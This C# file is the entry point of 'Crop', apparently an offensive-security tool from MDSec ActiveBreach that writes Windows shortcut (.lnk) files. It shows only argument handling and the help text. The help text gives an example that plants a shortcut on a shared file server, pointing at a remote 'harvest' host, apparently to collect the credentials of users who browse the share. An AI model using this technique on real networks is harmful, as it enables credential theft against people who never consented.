using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Crop
{
    class Program
    {
        static void ShowBanner()
        {
            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @domchell - MDSec ActiveBreach\n");
        }
        static void ShowHelp()
        {
            ShowBanner();
            Console.WriteLine("crop.exe <LNK value> <icon location> <output>");
            Console.WriteLine("\nExample:\ncrop.exe \\\\workstation@8888\\harvest \\\\workstation@8888\\harvest \\\\fileserver\\Common\\crop.lnk");
        }
        static void ParseArgs(string[] args)
        {
            Config.targetPath = args[0].Trim();
            Config.targetIcon = args[1].Trim();
            Config.targetLocation = args[2].Trim();
            Console.WriteLine("[*] Setting LNK value: {0}", Config.targetPath);
            Console.WriteLine("[*] Icon location: {0}", Config.targetIcon);
            Console.WriteLine("[*] Writing LNK to: {0}", Config.targetLocation);
        }

        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                ShowHelp();
                return;
            }

            ShowBanner();
            ParseArgs(args);

            try
            {
                Crop.CreateCrop();
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
